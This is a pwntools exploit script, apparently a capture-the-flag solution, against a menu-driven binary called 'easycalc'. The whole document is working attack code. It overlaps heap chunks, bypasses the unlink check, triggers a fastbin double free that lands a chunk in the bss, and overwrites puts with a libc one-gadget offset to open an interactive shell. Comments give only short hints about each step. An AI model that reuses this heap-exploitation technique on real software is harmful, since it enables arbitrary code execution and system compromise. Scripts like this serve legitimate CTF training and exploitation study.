#!/usr/bin/env python
from pwn import *
p=process('./easycalc',{'LD_PRELOAD':'./libc.so.6'})
libc=p.libc
context.log_level='debug'
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def create(index,size,a,b,astring,sline=1):
    ru('>\n')
    sl('1')
    ru('index\n')
    sl(str(index))
    ru('size\n')
    sl(str(size))
    ru('b\n')
    sl(a)
    # sleep(0.1)
    sl(b)
    ru('string\n')
    if sline:
        sl(astring)
    else:
        sd(astring)

def edit(index,a,b):
    ru('>\n')
    sl('3')
    ru('index\n')
    sl(str(index))
    ru('b\n')
    sl(a)
    sl(b)

def drop(index):
    ru('>\n')
    sl('4')
    ru('index\n')
    sl(str(index))


create(0,0xf8,'0','0','123')  
create(4,0xf0,'0','0','123')              # bypass unlink check
create(1,0x60,'0','0','123')              # overlap
create(2,0xf0,'0','0','123')              # merge witht chunk0
#==========================================
create(8,0x60,'0','0','123')              # use to double free
create(3,0x10,'0','0','123')              # aviod consolidate


drop(0)
drop(1)
create(1,0x68,'0','0','a'*0x58+p64(0x270),0)

drop(2)
create(0,0xf0,'0','0','123')
create(5,0xf0,'0','0','123')
create(6,0x60,'0','0','123')
create(7,0xf0,'0','0','123')              
drop(1)
drop(8)
drop(6)
drop(7)

create(6,0x60,str(0x201065),'+','123')           # fastbin: chunk6 --> chunk8 --> chunk1
                                                 # chunk1 and chunk6 double free  
create(7,0x60,'0','0','123')          
create(1,0x60,'123','123','123')                # double free
create(2,0xf0,'0','0','123')

create(8,0x60,'123456','0','a'*3+p64(0x70)+'\x00'*0x40+'\x20',0)      # point to bss

libc.address=0
off=libc.symbols['puts']

one_off=0x45216
one_off=0x4526a
one_off=0xf02a4
# one_off=0xf1147

sub=-off+one_off
edit(8,'+',str(sub))

# gdb.attach(p,'bcall puts')

# drop(8)




p.interactive()